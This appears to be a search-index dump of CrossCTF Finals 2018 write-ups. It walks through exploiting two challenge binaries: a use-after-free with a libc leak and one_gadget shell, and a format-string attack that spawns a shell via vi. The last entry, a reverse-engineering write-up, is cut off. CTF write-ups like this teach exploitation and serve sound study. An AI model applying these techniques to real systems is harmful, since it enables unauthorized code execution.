\nbuild_bear()\n is to allocate \n0xb8\n size of memory using malloc() then initialize it using user-provided values, then set the global \nbears\n array's last unused element to our the address of the bear (\nbears[v0]=v1\n, where v0 is the ```num_bears). The 'bear' struct seems to as follows:\n\n\nstruct bear{\n    char name[32];\n    int id;\n    int age;\n    char desc[128];\n    void* free_ptr;\n    void* self_destruct_device_ptr;\n}\n\n\n\n\nOnce we have 13 bears built already, we enter some sort of secret section, which lets us set \nadmin_enabled\n to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse.\n\n\n\n\nIDA Pro sometimes goofs up its decompiler. What the \nv3-- == \"nt\"\n really means is \nv3-- == (__int64)SUNIATRETNE\"-1\n, or whether v3-- points to the byte before the \"S\".\n\n\nThe above can be simplified to\n\n\n\n\nv3 = (__int64)\nSUNIATRETNE\n; // v3 is a POINTER\n_printf_chk(1LL, \nHere we are now... \n);\nwhile ( 1 )\n{\n    read(0, \nbuf, 1uLL);\n    if ( v3[10] != buf )\n        break;\n    if ( --v3 == (__int64)\nSUNIATRETNE\n-1)\n    {\n        read(0, \nbuf, 1uLL);\n        admin_enabled = 1;\n        return __readfsqword(0x28u) ^ v5;\n    }\n}\n\n\n\n\nOn to the next function ...\n\n\nunsigned __int64 select_bear()\n{\n  unsigned int v1; // [rsp+4h] [rbp-14h]\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = __readfsqword(0x28u);\n  v1 = 0;\n  _printf_chk(1LL, \nSelection: \n);\n  _isoc99_scanf(\n%d\n, \nv1);\n  if ( (v1 \n 0x80000000) == 0 \n v1 \n *num_bears )\n    selected_bear = (void *)bears[v1];\n  else\n    puts(\nNot enough bears.\n);\n  return __readfsqword(0x28u) ^ v2;\n}\n\n\n\n\nThe program reads in a number, lets say \na\n. If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index \na\n. Else, it prints out \"Not enough bears\".\n\n\n\n\n(v1 \n 0x800000000)==0\n means \nfirst bit of v1 == 0\n, and the first bit of a integer is its sign bit, according to 2s complement notation.\n\n\n\n\nint delete_bear()\n{\n  if ( !selected_bear )\n    return puts(\nNo bear selected!\n);\n  _printf_chk(1LL, \nDeleting [%s]...\\n\n);\n  if ( (void (**)(void *))selected_bear-\nfree_function == \nfree )\n    free(selected_bear);\n  return puts(\nDeleted!\n);\n}\n\n\n\n\nThe function \nfree()'s\n the pointer in \nselected_bear\n, as long as the \nfree_function\n still points to free.\n\n\n\n\nThe \nselected_bear\n is not zero'ed out.\n\nThe \nbears[idx]\n is not zero'ed out.\n\nThis challenge is a typical UAF challenge.\n\n\nnum_bears\n is not decremented\n\n\n\n\nint print_bear()\n{\n  __int64 v0; // rdx\n  __int64 v1; // rdx\n\n  if ( !selected_bear )\n    return puts(\nNo bear selected!\n);\n  puts(art);\n  _printf_chk(1LL, \nYou have selected: [%s]\\n\n);\n  v0 = (unsigned int)selected_bear-\nid;\n  _printf_chk(1LL, \nIt's ID is %x\\n\n);\n  v1 = (unsigned int)selected_bear-\nage;\n  _printf_chk(1LL, \nIt's AGE is %d\\n\n);\n  return _printf_chk(1LL, \nIt's DESCRIPTION is %s\\n\n);\n}\n\n\n\n\nThis function just prints out information about the \nselected_bear\n.\n\n\nunsigned __int64 add_comment()\n{\n  unsigned int nbytes;\n\n  _printf_chk(1LL, \nHow long should the comment be: \n);\n  _isoc99_scanf(\n%d\n, \nnbytes);\n  comment = calloc(nbytes + 1, 1uLL);\n  _printf_chk(1LL, \nComment: \n);\n  read(0, comment, nbytes[0]);\n  return;\n}\n\n\n\n\nHere comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls \ncalloc(nbytes+1, 1)\n, which is the same as \nmalloc(nbytes+1)\n.\n\n\n\n\nIf we \ndelete_bear()\n then \nadd_comment()\n of size \n0xb8-1\n, we can control ALL OF THE BEAR, including its \nself_destruct_device_ptr\n, which will be called later on...\n\n \nInsert evil laugh here\n\n\n\n\nint print_comment()\n{\n  int result; // eax\n\n  if ( comment )\n    result = puts((const char *)comment);\n  else\n    result = puts(\nNo\n);\n  return result;\n}\n\n\n\n\nPretty basic, prints the comment or prints \"No\" if theres no comment.\n\n\nint destruction()\n{\n  int result; // eax\n\n  if ( !admin_enabled )\n    return puts(\nNothing to do\n);\n  result = (signed int)selected_bear;\n  if ( selected_bear )\n    result = (selected_bear-\nself_destruct_device_ptr)(*num_bears);\n  return result;\n}\n\n\n\n\nIf \nadmin_enabled\n is true and \nselected_bear\n is valid,\nwe can execute \nselected_bear\n's \nself_destruct_device_ptr\n\n\nSolution\n\n\nAs mentioned earlier, this is a typical UAF challenge. The obvious steps so far are:\n1. Build Bear \n    1. Put arbitrary data\n2. Select Bear\n    1. Select 0\n3. Delete Bear\n4. Add Comment\n    1. The size of the comment must be \n0xb8-1\n, so that we \ncalloc(0xb8,1)\n and so that it will reuse the free memory that belonged to \nbears[0]\n\n    2. We can send \n0xb0\n arbitrary bytes, then send our desired function pointer, let's say, \n0xcafebabe\n\n5. We call Build Bear 12 more times\n    1. Put arbitrary data again\n6. Build Bear (we already have 13 bears, this will go to the secret section now)\n    1. This time, we send \nSUNIATRETNE\n in reverse, and this will set admin_enabled to 1\n7. Destruction\n\n\nNow the question is, what do we want to execute?\n\n\nThere isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway\n\n\n$ checksec gruffybear\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\n\n\n\nLets go hunting for a leak!\n\n\nActually thats really easy, since we are freeing a \nsmallbin-sized chunk (0xb8 = 184)\n. If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called \nfd\n, which are the first 8 bytes of the bear's name.\nTo do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk.\n\n\nWe can use \nprint_bear()\n to leak this address, then call a libc function.\n\n\nSo now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid.\n\n\nI use the tool \none_gadget\n to do this.\n\n\n$ one_gadget libc-2.23.so\n0x45216 execve(\n/bin/sh\n, rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\n/bin/sh\n, rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve(\n/bin/sh\n, rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve(\n/bin/sh\n, rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n\n\n\nI chose the second last one (it was at random)\n\n\nSo now, our steps are as follows\n1. Build Bear \n    1. Put arbitrary data\n1. Build Bear \n    1. Put arbitrary data\n2. Select Bear\n    1. Select 0\n3. Delete Bear\n4. Print Bear\n    1. This will give us the libc smallbin address for size 0xb8 (in the name)\n    2. This address is also 0x70+__realloc_hook, which was the calculation I used\n4. Add Comment\n    1. The size of the comment must be \n0xb8-1\n, so that we \ncalloc(0xb8,1)\n and so that it will reuse the free memory that belonged to \nbears[0]\n\n    2. We can send \n0xb0\n arbitrary bytes, then send our desired function pointer, which is \nlibc_base+0xf02a4\n\n    3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway)\n5. We call Build Bear 11 more times\n    1. Put arbitrary data again\n6. Build Bear (we already have 13 bears, this will go to the secret section now)\n    1. This time, we send \nSUNIATRETNE\n in reverse, and this will set admin_enabled to 1\n7. Destruction\n\n\nThe final solution is in \nhere", 
            "title": "GruffyBear"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/gruffybear/README/#crossctf-finals-2018-gruffybear-pwn", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : GruffyBear (Pwn)"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/gruffybear/README/#first-blood-by-n0x10u5-g4s3s", 
            "text": "There's something fishy about this Build-A-Bear workshop...  nc ctf.pwn.sg 4002  Creator - amon (@nn_amon)", 
            "title": "First Blood by : N0X10U5 G4S3S"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/gruffybear/README/#static-analysis", 
            "text": "Running  file gruffybear  gives:  gruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped  The code:  int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+4h] [rbp-24h]\n  unsigned __int64 v5; // [rsp+8h] [rbp-20h]\n\n  v5 = __readfsqword(0x28u);\n  setvbuf(stdin, 0LL, 2, 0LL);\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stderr, 0LL, 2, 0LL);\n  v4 = 999;\n  alarm(0x3Cu);\nLABEL_2:\n  while ( v4 )\n  {\n    while ( 2 )\n    {\n      print_banner();\n      _isoc99_scanf( %d ,  v4);\n      switch ( v4 )\n      {\n        case 1:\n          build_bear();\n          goto LABEL_2;\n        case 2:\n          select_bear();\n          goto LABEL_2;\n        case 3:\n          delete_bear();\n          goto LABEL_2;\n        case 4:\n          print_bear();\n          goto LABEL_2;\n        case 5:\n          add_comment();\n          goto LABEL_2;\n        case 6:\n          print_comment();\n          goto LABEL_2;\n        case 7:\n          destruction();\n          if ( !v4 )\n            return 0;\n          continue;\n        default:\n          puts( Nothing to do. );\n          break;\n      }\n      break;\n    }\n  }\n  return 0;\n}  main()  does some setup like turning off buffering, and calling  alarm(0x3cu) . This sets us on a time limit, after which the program will crash.   Make sure to  nop  the call to  alarm()  using your tool. e.g. in  radare2  you would go to the address of the call then  wx 9090909090  .   In a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program.  unsigned __int64 build_bear()\n{\n  __int64 v0; // rbp\n  bear *v1; // rbx\n  const char *v3; // rbx\n  char buf; // [rsp+7h] [rbp-21h]\n  unsigned __int64 v5; // [rsp+8h] [rbp-20h]\n\n  v5 = __readfsqword(0x28u);\n  v0 = num_bears[0];\n  if ( num_bears[0]   12 )\n  {\n    v3 =  SUNIATRETNE ;\n    _printf_chk(1LL,  Here we are now...  );\n    while ( 1 )\n    {\n      read(0,  buf, 1uLL);\n      if ( v3[10] != buf )\n        break;\n      if ( --v3 ==  nt  )\n      {\n        read(0,  buf, 1uLL);\n        admin_enabled = 1;\n        return __readfsqword(0x28u) ^ v5;\n      }\n    }\n  }\n  else\n  {\n    v1 = (bear *)calloc(1uLL, 0xB8uLL);\n    bears[v0] = v1;\n    _printf_chk(1LL,  Bear Name:  );\n    read(0, v1, 0x1FuLL);\n    _printf_chk(1LL,  Bear ID:  );\n    _isoc99_scanf( %x ,  v1- id);\n    _printf_chk(1LL,  Bear Age:  );\n    _isoc99_scanf( %d ,  v1- age);\n    _printf_chk(1LL,  Bear Description:  );\n    read(0, v1- description, 0x80uLL);\n    v1- free_function = (__int64) free;\n    v1- self_destruct_device_ptr = (__int64)self_destruct_device;\n    puts( Bear created! );\n    ++num_bears[0];\n  }\n  return __readfsqword(0x28u) ^ v5;\n}  The typical functionality of  build_bear()  is to allocate  0xb8  size of memory using malloc() then initialize it using user-provided values, then set the global  bears  array's last unused element to our the address of the bear ( bears[v0]=v1 , where v0 is the ```num_bears). The 'bear' struct seems to as follows:  struct bear{\n    char name[32];\n    int id;\n    int age;\n    char desc[128];\n    void* free_ptr;\n    void* self_destruct_device_ptr;\n}  Once we have 13 bears built already, we enter some sort of secret section, which lets us set  admin_enabled  to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse.   IDA Pro sometimes goofs up its decompiler. What the  v3-- == \"nt\"  really means is  v3-- == (__int64)SUNIATRETNE\"-1 , or whether v3-- points to the byte before the \"S\".  The above can be simplified to   v3 = (__int64) SUNIATRETNE ; // v3 is a POINTER\n_printf_chk(1LL,  Here we are now...  );\nwhile ( 1 )\n{\n    read(0,  buf, 1uLL);\n    if ( v3[10] != buf )\n        break;\n    if ( --v3 == (__int64) SUNIATRETNE -1)\n    {\n        read(0,  buf, 1uLL);\n        admin_enabled = 1;\n        return __readfsqword(0x28u) ^ v5;\n    }\n}  On to the next function ...  unsigned __int64 select_bear()\n{\n  unsigned int v1; // [rsp+4h] [rbp-14h]\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = __readfsqword(0x28u);\n  v1 = 0;\n  _printf_chk(1LL,  Selection:  );\n  _isoc99_scanf( %d ,  v1);\n  if ( (v1   0x80000000) == 0   v1   *num_bears )\n    selected_bear = (void *)bears[v1];\n  else\n    puts( Not enough bears. );\n  return __readfsqword(0x28u) ^ v2;\n}  The program reads in a number, lets say  a . If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index  a . Else, it prints out \"Not enough bears\".   (v1   0x800000000)==0  means  first bit of v1 == 0 , and the first bit of a integer is its sign bit, according to 2s complement notation.   int delete_bear()\n{\n  if ( !selected_bear )\n    return puts( No bear selected! );\n  _printf_chk(1LL,  Deleting [%s]...\\n );\n  if ( (void (**)(void *))selected_bear- free_function ==  free )\n    free(selected_bear);\n  return puts( Deleted! );\n}  The function  free()'s  the pointer in  selected_bear , as long as the  free_function  still points to free.   The  selected_bear  is not zero'ed out. The  bears[idx]  is not zero'ed out. This challenge is a typical UAF challenge.  num_bears  is not decremented   int print_bear()\n{\n  __int64 v0; // rdx\n  __int64 v1; // rdx\n\n  if ( !selected_bear )\n    return puts( No bear selected! );\n  puts(art);\n  _printf_chk(1LL,  You have selected: [%s]\\n );\n  v0 = (unsigned int)selected_bear- id;\n  _printf_chk(1LL,  It's ID is %x\\n );\n  v1 = (unsigned int)selected_bear- age;\n  _printf_chk(1LL,  It's AGE is %d\\n );\n  return _printf_chk(1LL,  It's DESCRIPTION is %s\\n );\n}  This function just prints out information about the  selected_bear .  unsigned __int64 add_comment()\n{\n  unsigned int nbytes;\n\n  _printf_chk(1LL,  How long should the comment be:  );\n  _isoc99_scanf( %d ,  nbytes);\n  comment = calloc(nbytes + 1, 1uLL);\n  _printf_chk(1LL,  Comment:  );\n  read(0, comment, nbytes[0]);\n  return;\n}  Here comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls  calloc(nbytes+1, 1) , which is the same as  malloc(nbytes+1) .   If we  delete_bear()  then  add_comment()  of size  0xb8-1 , we can control ALL OF THE BEAR, including its  self_destruct_device_ptr , which will be called later on...   Insert evil laugh here   int print_comment()\n{\n  int result; // eax\n\n  if ( comment )\n    result = puts((const char *)comment);\n  else\n    result = puts( No );\n  return result;\n}  Pretty basic, prints the comment or prints \"No\" if theres no comment.  int destruction()\n{\n  int result; // eax\n\n  if ( !admin_enabled )\n    return puts( Nothing to do );\n  result = (signed int)selected_bear;\n  if ( selected_bear )\n    result = (selected_bear- self_destruct_device_ptr)(*num_bears);\n  return result;\n}  If  admin_enabled  is true and  selected_bear  is valid,\nwe can execute  selected_bear 's  self_destruct_device_ptr", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/gruffybear/README/#solution", 
            "text": "As mentioned earlier, this is a typical UAF challenge. The obvious steps so far are:\n1. Build Bear \n    1. Put arbitrary data\n2. Select Bear\n    1. Select 0\n3. Delete Bear\n4. Add Comment\n    1. The size of the comment must be  0xb8-1 , so that we  calloc(0xb8,1)  and so that it will reuse the free memory that belonged to  bears[0] \n    2. We can send  0xb0  arbitrary bytes, then send our desired function pointer, let's say,  0xcafebabe \n5. We call Build Bear 12 more times\n    1. Put arbitrary data again\n6. Build Bear (we already have 13 bears, this will go to the secret section now)\n    1. This time, we send  SUNIATRETNE  in reverse, and this will set admin_enabled to 1\n7. Destruction  Now the question is, what do we want to execute?  There isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway  $ checksec gruffybear\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled  Lets go hunting for a leak!  Actually thats really easy, since we are freeing a  smallbin-sized chunk (0xb8 = 184) . If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called  fd , which are the first 8 bytes of the bear's name.\nTo do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk.  We can use  print_bear()  to leak this address, then call a libc function.  So now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid.  I use the tool  one_gadget  to do this.  $ one_gadget libc-2.23.so\n0x45216 execve( /bin/sh , rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve( /bin/sh , rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve( /bin/sh , rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve( /bin/sh , rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL  I chose the second last one (it was at random)  So now, our steps are as follows\n1. Build Bear \n    1. Put arbitrary data\n1. Build Bear \n    1. Put arbitrary data\n2. Select Bear\n    1. Select 0\n3. Delete Bear\n4. Print Bear\n    1. This will give us the libc smallbin address for size 0xb8 (in the name)\n    2. This address is also 0x70+__realloc_hook, which was the calculation I used\n4. Add Comment\n    1. The size of the comment must be  0xb8-1 , so that we  calloc(0xb8,1)  and so that it will reuse the free memory that belonged to  bears[0] \n    2. We can send  0xb0  arbitrary bytes, then send our desired function pointer, which is  libc_base+0xf02a4 \n    3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway)\n5. We call Build Bear 11 more times\n    1. Put arbitrary data again\n6. Build Bear (we already have 13 bears, this will go to the secret section now)\n    1. This time, we send  SUNIATRETNE  in reverse, and this will set admin_enabled to 1\n7. Destruction  The final solution is in  here", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/", 
            "text": "CrossCTF Finals 2018 : Souvlaki Space Station (Pwn)\n\n\nFirst Blood by : OSI Layer 8\n\n\n\n\nPictures and I've fallen Wonder why I'm here now\n\n\nnc ctf.pwn.sg 4006\n\n\nCreator - amon (@nn_amon)\n\n\nHint: Try examining the use of 'strlen()' and 'signal()'.\n\n\n\n\nStatic Analysis\n\n\n~~Well what do you know, I'm really starting to hate ARM~~\n\n\nStatic analysis using IDA just fails. The printed code was 5 lines long and the function calls did not match what was actually being called in the function at runtime. Viewing the function in graph mode, there are pieces of code that IDA just didn't detect as part of the control flow graph, and goofed up.\n\n\nI was determined to actually learn ARM assembly in the last 8 hours or so, but luckily the source was released soon after ;)\n\n\n#include \nstdio.h\n\n#include \nsys/types.h\n\n#include \nunistd.h\n\n#include \nsignal.h\n\n#include \nstdlib.h\n\n#include \nstdint.h\n\n#include \nstring.h\n\n\ntypedef struct state {\n    int admin;\n    char message[128];\n    char * presenter;\n    size_t length;\n} state;\n\nstate global_state;\n\nvoid sighandler(int signum)\n{\n    signal(signum, SIG_DFL);\n    puts(\nsouvlaki.c:10:5: warning: implicit declaration of function \u2018exit\u2019 [-Wimplicit-function-declaration]\n);\n    puts(\n     exit(1);\n);\n    puts(\nsouvlaki.c:10:5: warning: incompatible implicit declaration of built-in function \u2018exit\u2019\n);\n    puts(\nsouvlaki.c:10:5: note: include \u2018\nstdlib.h\n\u2019 or provide a declaration of \u2018exit\u2019\n);\n    if (global_state.admin) {\n        puts(\nTo report this bug, please contact support@linux.org.\n);\n        execl(\n/usr/bin/vi\n, NULL);\n    }\n    exit(1);\n}\n\nvoid init() {\n    global_state.admin = 0;\n    strcpy(global_state.message, \nP L A C E H O L D E R  T E X T  M A N\n);\n    global_state.presenter = \n[EC2 (%lld/150)]: \n;\n    global_state.length = strlen(global_state.message) + 1;\n}\n\nint main()\n{\n    state * ptr = \nglobal_state;\n    ++ptr;\n    --ptr;\n    init();\n\n    // Disable buffering on stdin, stdout, and stderr\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    signal(SIGSEGV, sighandler);\n    uint64_t count = 1;\n\n    while (count \n= 150) {\n        printf(global_state.presenter, count);\n        read(0, global_state.message, global_state.length);\n        global_state.length = strlen(global_state.message) + 1;\n        for (int i = 0; i \n global_state.length; i++) {\n            if (global_state.message[i] == '\\n') {\n                global_state.message[i] = 0;\n            }\n        }\n        for (int i = 0 ; i \n global_state.length; i++) {\n            printf(\n%hhd \n, global_state.message[i]);\n        }\n        puts(\n);\n        ++count;\n    }\n\n    return 0;\n}\n\n\n\n\nWe have a signal handler set for \nSIGSEGV\n, segmentation fault, that runs \nvi\n. You can actually get shell from \nvi\n by going to command mode (type \n:\n), then entering \n!sh\n. Of couse, you need to set \nglobal_state.admin\n to a non-zero value first.\n\n\nThere's a very subtle bug in the while loop in main().\nFrom these:\n\n\nread(0, global_state.message, global_state.length);\nglobal_state.length = strlen(global_state.message) + 1;\n\n\n\n\nWe can see that \nglobal_state.length\n is \nintended\n to be used as the actual string length in \nread()\n, but we set it to actual string length (of the message) + 1 in the next line.\n\n\nThus, we can increase \nglobal_state.length\n by 1 if we fill up the \nglobal_state.message\n (send 'a' * the current \nglobal_state.length\n).\n\n\nSolution\n\n\nIf we can fill the entire 128 bytes of \nglobal_state.message\n (and make sure not to send any '\\n'), \nstrlen(global_state.message)\n will actually give us \n128 + number of non-zero bytes of global_state.presenter\n. Thus, we can edit the value of \nglobal_state.presenter\n as long as the value we want to write isn't too big. Note that 37 bytes are already filled with a pre-existing message.\n\n\nIf we change it to the address of our input, we can try to do a format string attack, since \nglobal_state.presenter\n is used as the formatting argument to printf.\n\n\nLuckily, PIE isn't enabled, and the \nglobal_state\n is stored in the .bss section, so we can write it with the address of our input, which is \n0x98ca0\n\n\n$ checksec souvlaki\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n\n\n\n\nNow we need to set \nglobal_state.admin\n to a non-zero value, and then crash the program.\n\n\nDynamic Analysis\n\n\nNow, I knew very little about ARM architecture and how printf() worked with its registers and stack, so I made the input a long string of \"%p ...\" first.\n\n\nLuckily the 7th argument printed out was the address of \nglobal_state.admin\n (\n0x00098c9c\n), and some arguments were very low values, like the 2nd argument (attempting to write to them would likely segfault).\n\n\nNow, we do a typical format string attack in our input by sending \"A%7$n\" (the 'A' is there so that 1 byte is printed already, and %n will write 1 to the address that is the 7th argument), then just try to print to the 2nd argument using \"%2$n\", which will crash the program and run \nvi\n for us. We have to pad this to 128 bytes, then finally send in our input's address.\n\n\nOnce \nvi\n starts up, we type in \n:!sh\n to get shell\n\n\nSolution code in \nhere", 
            "title": "Souvlaki Space Station"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/#crossctf-finals-2018-souvlaki-space-station-pwn", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : Souvlaki Space Station (Pwn)"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/#first-blood-by-osi-layer-8", 
            "text": "Pictures and I've fallen Wonder why I'm here now  nc ctf.pwn.sg 4006  Creator - amon (@nn_amon)  Hint: Try examining the use of 'strlen()' and 'signal()'.", 
            "title": "First Blood by : OSI Layer 8"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/#static-analysis", 
            "text": "~~Well what do you know, I'm really starting to hate ARM~~  Static analysis using IDA just fails. The printed code was 5 lines long and the function calls did not match what was actually being called in the function at runtime. Viewing the function in graph mode, there are pieces of code that IDA just didn't detect as part of the control flow graph, and goofed up.  I was determined to actually learn ARM assembly in the last 8 hours or so, but luckily the source was released soon after ;)  #include  stdio.h \n#include  sys/types.h \n#include  unistd.h \n#include  signal.h \n#include  stdlib.h \n#include  stdint.h \n#include  string.h \n\ntypedef struct state {\n    int admin;\n    char message[128];\n    char * presenter;\n    size_t length;\n} state;\n\nstate global_state;\n\nvoid sighandler(int signum)\n{\n    signal(signum, SIG_DFL);\n    puts( souvlaki.c:10:5: warning: implicit declaration of function \u2018exit\u2019 [-Wimplicit-function-declaration] );\n    puts(      exit(1); );\n    puts( souvlaki.c:10:5: warning: incompatible implicit declaration of built-in function \u2018exit\u2019 );\n    puts( souvlaki.c:10:5: note: include \u2018 stdlib.h \u2019 or provide a declaration of \u2018exit\u2019 );\n    if (global_state.admin) {\n        puts( To report this bug, please contact support@linux.org. );\n        execl( /usr/bin/vi , NULL);\n    }\n    exit(1);\n}\n\nvoid init() {\n    global_state.admin = 0;\n    strcpy(global_state.message,  P L A C E H O L D E R  T E X T  M A N );\n    global_state.presenter =  [EC2 (%lld/150)]:  ;\n    global_state.length = strlen(global_state.message) + 1;\n}\n\nint main()\n{\n    state * ptr =  global_state;\n    ++ptr;\n    --ptr;\n    init();\n\n    // Disable buffering on stdin, stdout, and stderr\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    signal(SIGSEGV, sighandler);\n    uint64_t count = 1;\n\n    while (count  = 150) {\n        printf(global_state.presenter, count);\n        read(0, global_state.message, global_state.length);\n        global_state.length = strlen(global_state.message) + 1;\n        for (int i = 0; i   global_state.length; i++) {\n            if (global_state.message[i] == '\\n') {\n                global_state.message[i] = 0;\n            }\n        }\n        for (int i = 0 ; i   global_state.length; i++) {\n            printf( %hhd  , global_state.message[i]);\n        }\n        puts( );\n        ++count;\n    }\n\n    return 0;\n}  We have a signal handler set for  SIGSEGV , segmentation fault, that runs  vi . You can actually get shell from  vi  by going to command mode (type  : ), then entering  !sh . Of couse, you need to set  global_state.admin  to a non-zero value first.  There's a very subtle bug in the while loop in main().\nFrom these:  read(0, global_state.message, global_state.length);\nglobal_state.length = strlen(global_state.message) + 1;  We can see that  global_state.length  is  intended  to be used as the actual string length in  read() , but we set it to actual string length (of the message) + 1 in the next line.  Thus, we can increase  global_state.length  by 1 if we fill up the  global_state.message  (send 'a' * the current  global_state.length ).", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/#solution", 
            "text": "If we can fill the entire 128 bytes of  global_state.message  (and make sure not to send any '\\n'),  strlen(global_state.message)  will actually give us  128 + number of non-zero bytes of global_state.presenter . Thus, we can edit the value of  global_state.presenter  as long as the value we want to write isn't too big. Note that 37 bytes are already filled with a pre-existing message.  If we change it to the address of our input, we can try to do a format string attack, since  global_state.presenter  is used as the formatting argument to printf.  Luckily, PIE isn't enabled, and the  global_state  is stored in the .bss section, so we can write it with the address of our input, which is  0x98ca0  $ checksec souvlaki\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)  Now we need to set  global_state.admin  to a non-zero value, and then crash the program.", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/souvlaki/README/#dynamic-analysis", 
            "text": "Now, I knew very little about ARM architecture and how printf() worked with its registers and stack, so I made the input a long string of \"%p ...\" first.  Luckily the 7th argument printed out was the address of  global_state.admin  ( 0x00098c9c ), and some arguments were very low values, like the 2nd argument (attempting to write to them would likely segfault).  Now, we do a typical format string attack in our input by sending \"A%7$n\" (the 'A' is there so that 1 byte is printed already, and %n will write 1 to the address that is the 7th argument), then just try to print to the 2nd argument using \"%2$n\", which will crash the program and run  vi  for us. We have to pad this to 128 bytes, then finally send in our input's address.  Once  vi  starts up, we type in  :!sh  to get shell  Solution code in  here", 
            "title": "Dynamic Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/", 
            "text": "CrossCTF Finals 2018 : Perfect (re)\n\n\n\n\n'Cause we lost it all Nothin' lasts forever\n\n\nCreator - amon (@nn_amon) Update: this definitely works with python 2.7.15\n\n\n\n\nChallenge\n\n\nWe were given a binary \nperfect\n.\n\n\nOpening it up in IDA gives us the following pseudocode.\n\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 v3; // rdx\n  __int64 v4; // rdx\n  __int64 v5; // rdx\n  __int64 v6; // rdx\n  char v8; // [rsp+10h] [rbp-460h]\n  char v9; // [rsp+20h] [rbp-450h]\n  int v10; // [rsp+24h] [rbp-44Ch]\n  char v11; // [rsp+30h] [rbp-440h]\n  int v12; // [rsp+34h] [rbp-43Ch]\n  char v13; // [rsp+40h] [rbp-430h]\n  char v14; // [rsp+50h] [rbp-420h]\n  char v15; // [rsp+60h] [rbp-410h]\n  unsigned __int64 v16; // [rsp+468h] [rbp-8h]\n\n  v16 = __readfsqword(0x28u);\n  __gmpz_init(\nv8);\n  __gmpz_set_ui(\nv8, 0LL);\n  __gmpz_init(\nv9);\n  __gmpz_set_ui(\nv9, 0LL);\n  __gmpz_init(\nv11);\n  __gmpz_set_ui(\nv11, 0LL);\n  __gmpz_init(\nv13);\n  __gmpz_set_ui(\nv13, 0LL);\n  __gmpz_init(\nv14);\n  __gmpz_set_ui(\nv14, 2LL);\n  __gmpz_mul_2exp(\nv14, \nv14, 212LL);\n  printf(\nEschucha? \n, \nv14);\n  __isoc99_scanf(\n%1023s\n, \nv15);\n  if ( (unsigned int)__gmpz_set_str(\nv11, \nv15, 10LL) )\n    __assert_fail(\nflag == 0\n, \nperfect.c\n, 0x20u, \nmain\n);\n  __gmpz_sub_ui(\nv11, \nv11, 1LL);\n  if ( (unsigned int)__gmpz_set_str(\nv13, \nv15, 10LL) )\n    __assert_fail(\nflag == 0\n, \nperfect.c\n, 0x23u, \nmain\n);\n  while ( v12 